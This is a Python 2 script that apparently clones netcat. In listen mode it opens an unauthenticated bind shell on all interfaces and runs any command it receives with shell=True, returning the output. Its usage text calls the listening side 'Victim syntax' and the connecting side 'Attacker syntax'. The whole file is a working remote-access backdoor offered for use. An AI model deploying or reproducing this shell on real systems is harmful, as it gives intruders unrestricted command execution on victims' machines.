#!/usr/bin/python2
import os
import threading
import socket
import getopt
import subprocess
import sys

listen = False
target = ""
port = "" 


def usage():
    print("\n")
    print("""-l --listen     -listen on [host]:[port] for 
                               incoming connections""")
    print("""-p --port       -listen on specific [port]""")
    print("""-t --target     -listen on specifiv [target]""")
    print("\n")
    print("Victim syntax : ./netcat.py -l -p [port]")
    print("Attacker syntax : ./netcat.py -t [target] -p [port]")
    sys.exit(0)

def client_sender():
    client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    client.connect((target , int(port)))

    while True :
        while 1 :
            data = raw_input("=> ")
            client.send(data)
            response = client.recv(1024)
            print(response)

def run_command(command):
    command = command.rstrip()
    try :
        output = subprocess.check_output(command , shell=True , universal_newlines=True )
    except :
        output = "Failed at executing the command"
    return output

def client_handler(client_socket):
    while True :
        while True :
            data = client_socket.recv(1024)
            if data == ":kill":
                client_socket.close()
                sys.exit(0)
            try :
                cmd , params = data.split(" " , 1)
                if cmd == "cd" :
                    os.chdir(params)
                    client_socket.send("Changed")
                    continue
            except :
                pass
            response = run_command(data)
            if not len(response):
                client_socket.send("\n")
            client_socket.send(response)

def server_loop():
    global target
    if not len(target) :
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    server.bind((target , int(port)))
    server.listen(5)

    while True :
        client_socket , addr = server.accept()
        client_thread = threading.Thread(target=client_handler , args=(client_socket,))
        client_thread.start()


def main():
    global port
    global listen
    global target

    if not len(sys.argv[1:]):
        usage()

    if sys.version[0] != "2" :
        print("[*]This script only works on executable python2 scripts")
        print("[*]chmod +x netcat.py")
        print("[*]./netcat <syntax>")
        sys.exit(0)

    try :
        opts , args = getopt.getopt(sys.argv[1:] , "hlt:p:" , ["--help" ,"--listen" , "--target" , "--port"])
    except getopt.GetoptError as err :
        print(err)
        usage()
    
    for opt , arg in opts :
        if opt in ["-h" ,"--help"]:
            usage()
        elif opt in ["-l" , "--listen"]:
            listen = True 
        elif opt in ["-t" ,"--target"]:
            target = arg
        elif opt in ["-p" , "--port"]:
            port = arg
        else :
            print("Unhandled Option ")
            usage()

    if listen :
        server_loop()

    if not listen and len(target) and port :
        client_sender()


main()
